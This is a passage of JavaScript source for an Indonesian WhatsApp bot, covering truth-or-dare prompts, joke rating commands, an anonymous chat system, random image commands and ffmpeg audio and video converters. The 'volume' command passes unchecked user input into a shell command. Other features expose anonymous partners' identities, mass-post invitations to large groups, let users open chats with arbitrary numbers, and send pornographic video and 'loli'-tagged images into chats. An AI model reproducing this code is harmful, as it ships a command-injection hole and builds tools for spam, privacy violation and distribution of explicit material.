'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
const ttrth = trut[Math.floor(Math.random() * trut.length)]
setReply(ttrth) 
break
case 'dare':
const dare = ['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot 🤥 setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
const der = dare[Math.floor(Math.random() * dare.length)]
setReply(der) 
break
case 'katailham':  
const afa = ilhamberkata[Math.floor(Math.random() * ilhamberkata.length)]
Fan.sendMessage(from, { text: ''+afa+'\n\n_-Ilham._'}, { quoted: setQuoted })
break
case 'bucin':
const sa = ngebucin[Math.floor(Math.random() * ngebucin.length)]
Fan.sendMessage(from, { text: ''+sa+'\n\n_-BUCIN._'}, { quoted: setQuoted })
break
case 'bisakah':
const bisakah = body.slice(1)
const bisa =['BISA','Tidak Bisa','Oh tentu saja bisa dong','Udah dari lahir dia bisa kaya gitu kak 😄','Oh tentu saja tidak bisa','Wuih bisa bisa','Ga mao jawab ah lu wibu','Tentu saja bisa eh tapi boong awokawok ','Engga engga dia ga bisa','Enggaklah','Aku ga mao jawbab 🙂','Rahasia dong','Ulangi Tod gua ga paham','Mana gua tau anjir']
const keh = bisa[Math.floor(Math.random() * bisa.length)]
Fan.sendMessage(from, { text: 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh }, { quoted: setQuoted })
break
case 'kapankah':
const kapankah = body.slice(1)
const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
const koh = kapan[Math.floor(Math.random() * kapan.length)]
Fan.sendMessage(from, { text: 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh}, { quoted: setQuoted })
break
case 'apakah':
const apakah = body.slice(1)
const apa =['iya dong jelas itu','Tidak lah','Oh tentu saja tidak','Ya mana saya tau kok tanya saya','Rahasia dong','ga usah di tanya emang udah kaya gitu dia','Au ah mending mandi','Bentar aku lagi berak','Knpa emang kamu suka sama dia yak ??','Haha mna mungkin 🤣']
const kah = apa[Math.floor(Math.random() * apa.length)]
Fan.sendMessage(from, { text: 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah}, { quoted: setQuoted })
break
case 'bagaimanakah':
const bagaimanakah = body.slice(1)
const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Gua tabok boleh ?','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan','Hah kamu tanya sama aku trus aku tanya ke siapa dong','Whahahaha ga tau 😑']
const mana = bagai[Math.floor(Math.random() * bagai.length)]
Fan.sendMessage(from, { text: 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana}, { quoted: setQuoted })
break													
case 'goblokcek': case 'jelekcek': case 'gaycek':case 'rate':
case 'lesbicek':case 'gantengcek': case 'cantikcek':case 'begocek': case 'suhucek':case 'pintercek':
case 'jagocek':case 'nolepcek':case 'babicek':case 'bebancek':case 'baikcek':
case 'jahatcek':case 'anjingcek':case 'haramcek':case 'pakboycek':
case 'pakgirlcek':case 'sangecek': case 'bapercek':case 'fakboycek':case 'alimcek':case 'suhucek':
case 'fakgirlcek':case 'kerencek':case 'wibucek':case 'pasarkascek':
const cex = body.slice(1)
const cek1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
Fan.sendMessage(from, { text: 'Pertanyaan : *'+cex+'*\n\nJawaban : '+ cek2+'%'}, { quoted: setQuoted })
break			
case 'watakcek': case 'cekwatak':
const watak = body.slice(1)
const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
const tak = wa[Math.floor(Math.random() * wa.length)]
Fan.sendMessage(from, { text: 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak}, { quoted: setQuoted })
break				
case 'hobbycek': case 'cekhobby':
const hobby = body.slice(1)
const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
const by = hob[Math.floor(Math.random() * hob.length)]
Fan.sendMessage(from, { text: 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by}, { quoted: setQuoted })
break
//━━━━━━━━━━━━━━━[ ANONYMOUS ]━━━━━━━━━━━━━━━━━//
case 'start': {
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Di Dalam Group!')
if (roomA || roomB ) return setReply("Kamu masih berada di dalam room anonymous,  ketik keluar untuk keluar dari room anonymous mu")
if (room) {
await Fan.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await Fan.sendMessage(room.b,{text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan`}) 
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))             
} else {
let id = + new Date
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired: Date.now() + toMs("5m")
}
anonChat.push(obj)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room anonymous\nMohon tunggu sedang mencari partner`)
}

}
break    
case 'stop':
case 'keluar': {
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Untuk Group!')
if(roomA && roomA.state == "CHATTING"){
await Fan.sendMessage(roomA.b, {text:"Partnermu telah meninggalkan room anonymous"})
await setTimeout(() => {
setReply("Kamu telah keluar dari room anonymous")
roomA.a = roomA.b
roomA.b = ""
roomA.state = "WAITING"
roomA.expired = Date.now() + toMs("5m")
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
},1000)
} else if(roomA && roomA.state == "WAITING"){
setReply("Kamu telah keluar dari room anonymous")
anonChat.splice(anonChat.indexOf(roomA, 1)) 
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
} else if(roomB && roomB.state == "CHATTING"){
await Fan.sendMessage(roomB.a,{text:`Partnermu telah meninggalkan room anonymous`})
setReply("Kamu telah keluar dari room anonymous dan meninggalkan partner mu")
roomB.b =""
roomB.state = "WAITING"
roomB.expired = Date.now() + toMs("5m")
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
} else setReply(`Kamu sedang tidak berada di room anonymous, tekan button untuk mencari partner`)
}
break
case 'next':{
if (isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (roomA && roomA.state == "WAITING" ) {
setReply("Mencari Partner...")
anonChat.splice(roomA, 1)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
await setTimeout( async () => {
if ( Object.values(anonChat).find(room => room.state === 'WAITING' && room.b == "")) {
await Fan.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await Fan.sendMessage(room.b,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))           
} else {
let id = + new Date
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired : Date.now() + toMs("5m")
}
anonChat.push(obj)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room baru\nSilakan tunggu partner masuk ke dalam room`)
}
}, 2000) 
} else if(roomA && roomA.state == "CHATTING" ){
await Fan.sendMessage(roomA.b, {text: "Partnermu telah mengeluarkanmu dari room Anonymous"})
setReply("Kamu telah mengeluarkan partnermu dari room anonymous ")
await setTimeout(() => {
setReply("Menunggu partner masuk ke dalam room")
roomA.b = ""
roomA.state = "WAITING"
roomA.expired = Date.now() + toMs("5m")
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
},1000)
} else if(roomB){
await Fan.sendMessage(roomB.a, {text: "Partner telah meninggalkan room anonymous mu"})
setReply("Mohon tunggu sedang mencari room")
roomB.b =  ""
roomB.state = "WAITING"
roomB.expired = Date.now() + toMs("5m")
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
await setTimeout( async () => {
if ( Object.values(anonChat).find(room => room.state === 'WAITING' && room.b == "")) {
await Fan.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await Fan.sendMessage(room.b,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))           
} else {
let id = + new Date
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired : Date.now() + toMs("5m")
}
anonChat.push(obj)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room baru\nSilakan tunggu partner masuk ke dalam room`)
}
}, 2000) 
} else setReply("Kamu sedang tidak berada di dalam room anonymous")
}
break
case 'sendkontak': {
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (roomA && roomA.state == "CHATTING") {
let profile = await Fan.profilePictureUrl(roomA.a)
let status = await Fan.fetchStatus(roomA.a)
let msg = await Fan.sendImage(roomA.b, profile, `Nama : ${await Fan.getName(roomA.a)}\nBio : ${status.status}\nUser : @${roomA.a.split("@")[0]}`, m, { mentions: [roomA.a] })
Fan.sendContact(roomA.b, roomA.a.split("@")[0], await Fan.getName(roomA.a))    
} else if(roomB && roomB.state == "CHATTING"){
let profile = await Fan.profilePictureUrl(roomB.b)
let status = await Fan.fetchStatus(roomB.b)
let msg = await Fan.sendImage(roomB.a, profile, `Nama : ${await Fan.getName(roomB.b)}\nBio : ${status.status}\nUser : @${roomB.b.split("@")[0]}`, m, { mentions: [roomB.b] })
Fan.sendContact(roomB.a, roomB.b.split("@")[0],await Fan.getName(roomB.b))
} else if(roomA == "undefined" || roomB == "undefined" ){
setReply("Kamu sedang tidak berada di room anonymous")
} else setReply("Kamu belum dapat mengirim kontak karena kamu belum punya partner")
}
break
case 'startchat': {
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Di Dalam Group!')
if(!q) return setReply("Masukan nomer target yang mau di chat")
if (roomA || roomB ) return setReply("Kamu masih berada di dalam room anonymous,  ketik keluar untuk keluar dari room anonymous mu")
let id = + new Date
const obj = {
id,
a: m.sender,
b: Pe,
state: "CHATTING",
expired: "INFINITY"
}
anonChat.push(obj)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room anonymous\nDan menjadikan ${Pe} sebagai partner mu\nSekarang kamu bisa mengirim pesan`)
}
break
case 'anonymous':{
if(isGroup) return setReply("Tidak bisa di gunakan di dalam group")
let teks =`
Anonymous Chat adalah
fitur yang memungkinkan kamu
berinteraksi dengan user lain
tanpa mengetahui identitas 
dan terintegrasi secara acak.

Klik start untuk memulai`
let mok = [
{"buttonId": `${prefix}start`,"buttonText": {"displayText": `START`},"type": "RESPONSE"},
{"buttonId": `${prefix}keluar`,"buttonText": {"displayText": `KELUAR`},"type": "RESPONSE"}]
Fan.sendButLoc(from, teks,fake,ofrply, mok)
}
break
case 'invite':{
if(isGroup) return setReply("Fitur tidak bisa di gunakan di dalam group")
if(!roomA) return setReply("Kamu sedang tidak berada di room anonymous")
if(roomB && roomB.state == "CHATTING" || roomA && roomA.state == "CHATTING" ) return setReply("Kamu sudah berada di room anonymous dan sudah memulai sesi chat")
let getGroups = await Fan.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let ana = groups.map(v => v.id)
let mem = [];
for (let i of ana) {
let data = await Fan.groupMetadata(i)
let obj = { id : data.id, total : data.participants.length}
await mem.push(obj) 
}
let groupInvite = await mem.filter(member => member.total > 50 )
let yesnih = [{"buttonId": `${prefix}joinchat ${roomA.id}`,"buttonText": {"displayText": `ᴊᴏɪɴ ᴄʜᴀᴛ`},"type": "RESPONSE"}]
let teks = `
Seseorang telah mengundang kamu 
untuk bergabung ke room anonymous chat
tekan tombol join chat di bawah ini untuk 
bergabung di room anonymous dan memulai 
sesi chat dengan user lain`
await Fan.sendMessage(from, {text: `Mengirim undangan anonymous, waktu selesai ${groupInvite.length * 3 } detik`})
for (let i of groupInvite) {
await sleep(3000)
await Fan.sendButLoc(i.id, teks,fake,ofrply, yesnih)
}
await Fan.sendMessage(from, {text: `Undangan telah terkirim ke ${groupInvite.length} group` })
}
break
case 'joinchat':{
if(!q) return setReply("Masukan id room anonymous")
if(roomA && roomA.state == "WAITING" ) return setReply("Kamu masih berada di room anonymous")
if(roomB && roomB.state == "CHATTING" || roomA && roomA.state == "CHATTING" ) return setReply("Kamu sudah berada di room anonymous dan sudah memulai sesi chat")
let joinRoom = Object.values(anonChat).find(room => room.id == q && room.state == "WAITING")
if (joinRoom) {
await Fan.sendMessage(joinRoom.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await Fan.sendMessage(joinRoom.b,{text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan`}) 
setReply(`Berhasil join ke room, silakan cek di chat bot\nAtau bisa klik nomer di bawah ini untuk memulai sesi chat\n\nhttp://wa.me/${botNumber.split("@")[0]}`)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))          
} else if (room) {
await Fan.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await Fan.sendMessage(room.b,{text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan`}) 
setReply(`Berhasil mendapatkan room, silakan cek di chat bot\nAtau bisa klik nomer di bawah ini untuk memulai sesi chat\n\nhttp://wa.me/${botNumber.split("@")[0]}`)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))            
} else {
let id = + new Date
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired: Date.now() + toMs("5m")
}
anonChat.push(obj)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
await Fan.sendMessage(sender,{text: `Kamu telah membuat room anonymous\nMohon tunggu sedang mencari partner`})
setReply(`Kamu telah membuat room anonymous\nMohon tunggu sedang mencari partner`)
}
}
break
//━━━━━━━━━━━━━━━[ RANDOM ]━━━━━━━━━━━━━━━━━//
case 'cecan': 
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
var query = ["cecan hd","cecan indo","cewe cantik", "cewe aesthetic", "cecan aesthetic"]
var data = await pinterest(pickRandom(query))
var but = [{buttonId: `${command}`, buttonText: { displayText: "Next Photo" }, type: 1 }]
Fan.sendMessage(from, { caption: "Random Cewe Cantik", image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: setQuoted })
break
case 'cogan': 
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
var query = ["cogan hd","cogan indo","cowo ganteng","handsome boy","hot boy","oppa","cowo aesthetic","cogan aesthetic"]
var data = await pinterest(pickRandom(query))
var but = [{buttonId: `${command}`, buttonText: { displayText: "Next Photo" }, type: 1 }]
Fan.sendMessage(from, { caption: "Random Cowo Ganteng", image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: setQuoted })
break 					
case 'anime':
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
await fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
imageToBase64(pjr)
.then((response) => {
media =  Buffer.from(response, 'base64');
Fan.sendMessage(from,{ image: media,caption:'NIH' },{quoted:setQuoted})
}
)
.catch((error) => {
console.log(error); 
}
)
});
break
case 'bokep':{
if (!isGroup) return reply('Di Group Aj Biar Dosanya Makin Gede')
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
Fan.sendMessage(from, { video: {url : `${bokep}`}, caption:`Nih Kak`, mimetype: 'video/mp4', ptt: true}, {quoted: setQuoted})
}
break
case 'loli': case 'milf': case 'husbu': case 'cosplay': case 'wallml':{
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
let kentir = await getBuffer(wipi)
let teks = "Nih"                                          
let buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'🐤OWNER'},type:1}]                            
Fan.sendButImage(from, teks, fake, kentir, buttons, {quoted: setQuoted})      
}
break 
case 'wallpapers':{
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
let link =`https://megayaa.herokuapp.com/api/akaneko/wallpapers`
let nana = await getBuffer(link)     
Fan.sendImage(from, nana, "Nih",setQuoted)
}
break
case 'wallpapermobile':{
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
let link =`https://megayaa.herokuapp.com/api/akaneko/mobileWallpapers`
let nana = await getBuffer(link)     
Fan.sendImage(from, nana, "Nih",setQuoted)
}
break
//━━━━━━━━━━━━━━━[ COVERTER ]━━━━━━━━━━━━━━━━━//
case 'toimg': {
if (!isQuotedSticker) return setReply('Reply stickernya')
let media = await Fan.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(err)
let buffer = fs.readFileSync(ran)
await Fan.sendMessage(from, {caption: "Nih", image: buffer})
fs.unlinkSync(ran)
})
}
break
case 'tomp3':
if (isQuotedVideo) {
onlyWait()
let media = await Fan.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -vn ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await Fan.sendMessage(from, {mimetype: 'audio/mp4', audio: buffer453}, { quoted: setQuoted })
fs.unlinkSync(ran)
})
} else {
setReply("Reply videonya")
}
break
case 'tomp4':
if (isQuotedSticker) {
onlyWait()
let file = await Fan.downloadAndSaveMediaMessage(quoted)
let outGif = `./media/video/${getRandom('.gif')}`
let outMp4 = `./media/video/${getRandom('.mp4')}`
exec(`convert ${file} ${outGif}`, (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, async (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}      
await Fan.sendMessage(from,{video: fs.readFileSync(outMp4), caption: "Nih"},{quoted: setQuoted})
fs.unlinkSync(outGif)
fs.unlinkSync(outMp4)
fs.unlinkSync(file)
})
}) 
}
break
case 'toptt':
if (isQuotedAudio){
onlyWait()
let media = await Fan.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply('Gagal mengkonversi audio ke ptt')
let topt = fs.readFileSync(ran)
await Fan.sendMessage(from,{audio: topt, mimetype: 'audio/mp4', ptt:true}, {quoted: setQuoted})
fs.unlinkSync(ran)
})
} else {
setReply("Reply audio")
}
break
case 'togif':
if ( isQuotedSticker) {
onlyWait()
let file = await  Fan.downloadAndSaveMediaMessage(quoted)
let outGif = `./media/video/${getRandom('.gif')}`
let outMp4 = `./media/video/${getRandom('.mp4')}`
exec(`convert ${file} ${outGif}`, (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, async (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}      
await sendGif(fs.readFileSync(outMp4))
fs.unlinkSync(outGif)
fs.unlinkSync(outMp4)
fs.unlinkSync(file)
})
}) 
} else if(isQuotedVideo){
onlyWait()
let outMp4 = getRandom('.mp4')
let file = await Fan.downloadAndSaveMediaMessage(quoted)
let nana = await fs.readFileSync(file)
await sendGif(nana)
await fs.unlinkSync(file)
}
break
case 'volume':
if (Number(args[0]) >= 11) return setReply("Maksimal volume adalah 10")
if (isQuotedAudio){ 
onlyWait()
let media3 = await Fan.downloadAndSaveMediaMessage(quoted)
let rname = getRandom('.mp3')
exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, async (err, stderr, stdout) => {
if (err) return setReply('Error!')
let jadie = fs.readFileSync(rname)
await Fan.sendMessage(from, {audio: jadie, mimetype: 'audio/mp4', ptt: true }, {quoted: setQuoted})
fs.unlinkSync(rname)
fs.unlinkSync(media3)
}
)
} else {
setReply('Reply audio!')
}
break
case 'hode':
if(isQuotedAudio) { 
onlyWait()
let medok = await Fan.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${medok} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(medok)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await Fan.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: setQuoted })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
case 'ghost':
if(isQuotedAudio) { 
onlyWait()
let mele = await Fan.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${mele} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(mele)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await Fan.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: setQuoted })
fs.unlinkSync(ran)
}) 
} else {
setReply('Reply audionya')
}
break
case 'nightcore':
if(isQuotedAudio) { 
onlyWait()
let mela = await Fan.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${mela} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(mela)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await Fan.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: setQuoted })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
case 'tupai':
if(isQuotedAudio) { 
onlyWait()
let medoi = await Fan.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${medoi} -filter:a "atempo=0.8,asetrate=65100" ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(medoi)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await Fan.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: setQuoted })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
case 'imut':
if(isQuotedAudio) { 
onlyWait() 
let masa = await Fan.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${masa} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(masa)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
